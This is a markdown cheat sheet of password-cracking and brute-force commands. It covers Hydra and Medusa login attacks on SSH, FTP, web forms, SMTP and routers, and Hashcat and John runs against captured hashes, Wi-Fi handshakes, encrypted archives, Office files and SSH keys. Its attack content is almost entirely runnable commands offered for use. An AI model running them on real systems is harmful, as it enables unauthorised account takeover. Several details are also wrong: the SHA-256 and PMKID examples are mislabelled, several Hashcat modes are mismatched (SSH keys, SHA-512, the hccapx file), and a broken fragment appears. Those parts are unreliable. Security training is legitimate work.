# Password Cracking and Brute Forcing Cheat Sheet

## Table of Contents

1. [Introduction](#introduction)
2. [Password Cracking Basics](#password-cracking-basics)
   - [Wordlists](#wordlists)
   - [Common Hash Types](#common-hash-types)
3. [Brute Forcing with Hydra](#brute-forcing-with-hydra)
   - [SSH](#ssh)
   - [FTP](#ftp)
   - [HTTP Forms](#http-forms)
   - [SMTP](#smtp)
   - [Router Login](#router-login)
4. [Cracking Hashes with Hashcat](#cracking-hashes-with-hashcat)
   - [MD5](#md5)
   - [SHA-1 and SHA-256](#sha-1-and-sha-256)
   - [NTLM](#ntlm)
   - [Wi-Fi (WPA2)](#wi-fi-wpa2)
   - [Additional Useful Hash Types](#additional-useful-hash-types)
5. [Advanced Techniques](#advanced-techniques)
   - [Mask Attacks](#mask-attacks)
   - [Combination Attacks](#combination-attacks)
   - [Rule-Based Attacks](#rule-based-attacks)
6. [Real-Life Scenarios](#real-life-scenarios)
   - [Extracting Hashes from Databases](#extracting-hashes-from-databases)
   - [Recovering Wi-Fi Passwords](#recovering-wi-fi-passwords)
   - [Router Password Cracking](#router-password-cracking)
7. [Zip PDF and other files](#Zip-PDF-and-other-files)
   - [ZIP Files](#zip-files)
   - [PDF Files](#pdf-files)
   - [7z Files](#7z-files)
   - [Office Files (Word, Excel, PowerPoint)](#office-files-word-excel-powerpoint)
   - [Cracking SSH Password Keys](#cracking-ssh-password-keys)
9. [Tools and Resources](#tools-and-resources)
---

## Introduction
This cheat sheet covers extensive techniques for password cracking and brute forcing using tools like Hydra and Hashcat. It includes real-life examples, explanations, and use cases to help ethical hackers in penetration testing and real-world engagements.

## Password Cracking Basics

### Wordlists
- **Common Wordlists**:
  - `rockyou.txt`: Most popular wordlist for password cracking.
  - `SecLists`: Extensive wordlists for various scenarios. [SecLists GitHub](https://github.com/danielmiessler/SecLists)

### Common Hash Types
| Hash Type    | Example                              |
| ------------ | ------------------------------------ |
| MD5          | `5d41402abc4b2a76b9719d911017c592` |
| SHA-1        | `2aae6c35c94fcfb415dbe95f408b9ce91ee846ed` |
| SHA-256      | `9b74c9897bac770ffc029102a200c5de` |
| NTLM         | `8846f7eaee8fb117ad06bdd830b7586c` |
| WPA2 (PMKID) | `01a63e2fd3b4f5d4e3df0c4e6f22f8e3` |

## Brute Forcing with Hydra

### SSH
```bash
hydra -l root -P /path/to/wordlist.txt ssh://<target_ip>
```

### FTP
```bash
hydra -l anonymous -P /path/to/wordlist.txt ftp://<target_ip>
```

### HTTP Forms
```bash
hydra -l admin -P /path/to/wordlist.txt <target_ip> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

### SMTP
```bash
hydra -l admin -P /path/to/wordlist.txt smtp://<target_ip>
```

### Router Login
```bash
hydra -l admin -P /path/to/wordlist.txt http-get://<router_ip>
```

## Cracking Hashes with Hashcat

### MD5
Example hash in `hash.txt`:
```plaintext
5d41402abc4b2a76b9719d911017c592
```
Command:
```bash
hashcat -m 0 -a 0 hash.txt /path/to/wordlist.txt
```

### SHA-1 and SHA-256
Example hashes in `hash.txt`:
```plaintext
SHA-1: 2aae6c35c94fcfb415dbe95f408b9ce91ee846ed
SHA-256: 9b74c9897bac770ffc029102a200c5de
```
Commands:
```bash
hashcat -m 100 -a 0 hash.txt /path/to/wordlist.txt
hashcat -m 1400 -a 0 hash.txt /path/to/wordlist.txt
```

### NTLM
Example hash in `hash.txt`:
```plaintext
8846f7eaee8fb117ad06bdd830b7586c
```
Command:
```bash
hashcat -m 1000 -a 0 hash.txt /path/to/wordlist.txt
```

### Wi-Fi (WPA2)
Example PMKID hash in `hash.txt`:
```plaintext
01a63e2fd3b4f5d4e3df0c4e6f22f8e3
```
Command:
```bash
hashcat -m 22000 -a 0 handshake.hccapx /path/to/wordlist.txt
```

### Additional Useful Hash Types
- **bcrypt** (mode `3200`):
  ```bash
  hashcat -m 3200 -a 0 hash.txt /path/to/wordlist.txt
  ```
- **SHA-512** (mode `1800`):
  ```bash
  hashcat -m 1800 -a 0 hash.txt /path/to/wordlist.txt
  ```
- **Linux Shadow File (mode `500` or `1800` depending on hashing method)**:
  ```bash
  hashcat -m 1800 -a 0 shadow.txt /path/to/wordlist.txt
  ```

## Advanced Techniques

### Mask Attacks
Useful when parts of the password are known (e.g., format or length).
```bash
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?d?d
```

### Combination Attacks
Combine two wordlists to generate new password candidates.
```bash
hashcat -m 0 -a 1 hash.txt /path/to/wordlist1.txt /path/to/wordlist2.txt
```

### Rule-Based Attacks
Apply transformations to wordlists using predefined rules.
```bash
hashcat -m 0 -a 0 -r rules/best64.rule hash.txt /path/to/wordlist.txt
```

## Real-Life Scenarios

### Extracting Hashes from Databases
- **MySQL Hashes**:
  ```sql
  SELECT user, password FROM mysql.user;
  ```
- Use `hashcat` with the corresponding hash mode.

### Recovering Wi-Fi Passwords
1. Capture the handshake using `airodump-ng`.
2. Convert the capture file to `hccapx` format using `aircrack-ng`.
3. Crack the hash using `hashcat`:
   ```bash
   hashcat -m 22000 -a 0 handshake.hccapx /path/to/wordlist.txt
   ```

### Router Password Cracking
- **Brute Force Router Admin Panel**:
  ```bash
  hydra -l admin -P /path/to/wordlist.txt http-get://<router_ip>/admin
  ```
- **Extract Router Hash**: Use configuration file backup and identify password hashes, then crack with `hashcat`.
  ## ZIP Files
Hashcat can be used for cracking ZIP file passwords, but you need to extract the hash first.

- **Extract the hash from the ZIP file using `zip2john`** (from John the Ripper):
  ```bash
  zip2john <file.zip> > zip_hash.txt
  ```

- **Crack the ZIP file hash with Hashcat**:
  ```bash
  hashcat -m 13600 -a 0 zip_hash.txt /path/to/wordlist.txt
  ```

### Hashcat Mode for ZIP Files:
- **Mode**: `13600`

---

## PDF Files
For PDF files, you can use Hashcat to crack passwords, but like with ZIP files, you need to extract the hash first.

- **Extract the hash from the PDF file using `pdf2john`** (from John the Ripper):
  ```bash
  pdf2john.pl <file.pdf> > pdf_hash.txt
  ```

- **Crack the PDF file hash with Hashcat**:
  ```bash
  hashcat -m 10500 -a 0 pdf_hash.txt /path/to/wordlist.txt
  ```

### Hashcat Mode for PDF Files:
- **Mode**: `10500`

---

## Office Files (Word, Excel, PowerPoint)
Hashcat can also be used for cracking passwords on Office files, such as Word, Excel, and PowerPoint, after extracting the hash with `office2john` (from John the Ripper).

- **Extract the hash from the Office file using `office2john`**:
  ```bash
  office2john.py <file.docx> > office_hash.txt
  ```

- **Crack the Office file hash with Hashcat**:
  ```bash
  hashcat -m 9500 -a 0 office_hash.txt /path/to/wordlist.txt
  ```

### Hashcat Mode for Office Files:
- **Mode**: `9500`

---

## 7z Files
Hashcat can be used for cracking 7z archive passwords, but first, you need to extract the hash using `7z2john`.

- **Extract the hash from the 7z file using `7z2john`**:
  ```bash
  7z2john <file.7z> > 7z_hash.txt
  ```

- **Crack the 7z file hash with Hashcat**:
  ```bash
  hashcat -m 11600 -a 0 7z_hash.txt /path/to/wordlist.txt
  ```

### Hashcat Mode for 7z Files:
- **Mode**: `11600`

---

### Zip PDF and other files
- **
## Cracking SSH Password Keys
Cracking SSH keys generally refers to brute-forcing SSH login credentials or compromising weak SSH key pairs. Below are the methods for cracking SSH passwords or key-based authentication:

### 1. **Brute-Forcing SSH Passwords**
You can use **Hydra** or **Medusa** for brute-forcing SSH passwords. The most common method is using a password list to attempt to log in via SSH.

- **Using Hydra to brute-force SSH**:
  ```bash
  hydra -l <username> -P /path/to/wordlist.txt ssh://<target_ip>
  ```

  Replace `<username>` with the target username, `/path/to/wordlist.txt` with your wordlist, and `<target_ip>` with the target machine's IP address.

- **Using Medusa to brute-force SSH**:
  ```bash
  medusa -h <target_ip> -u <username> -P /path/to/wordlist.txt -M ssh
  ```

### 2. **Cracking SSH Private Key Passphrase**
If you have access to an SSH private key but it's encrypted with a passphrase, you can attempt to crack the passphrase using **John the Ripper** or **Hashcat**.

- **Using John the Ripper to crack SSH private key passphrase**:
  - First, extract the hash from the SSH key:
    ```bash
    ssh2john <path_to_ssh_private_key> > ssh_key_hash.txt
    ```
  - Then, use John the Ripper to crack it:
    ```bash
    john --wordlist=/path/to/wordlist.txt ssh_key_hash.txt
    ```

- **Using Hashcat for cracking SSH private key passphrase**:
  ```bash
  hashcat -m 16800 -a 0 ssh_key_hash.txt /path/to/wordlist.txt
  ```

  **Note**: Hashcat requires the hash format of the private key, which can be obtained using the `ssh2john` tool from John the Ripper.

---

## Tools and Resources
- [Hashcat](https://hashcat.net/hashcat/)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [RockYou](https://www.kaggle.com/datasets/wjburns/rockyou-wordlist)
- [John](https://github.com/openwall/john/tree/bleeding-jumbo)
- [John2zip, ssh2john] Go to the above link and seasrch john2zip or ssh2john in john repo
---
This cheat sheet is designed to assist ethical hackers in various password cracking and brute-forcing scenarios, covering both exam-related and real-world situations.
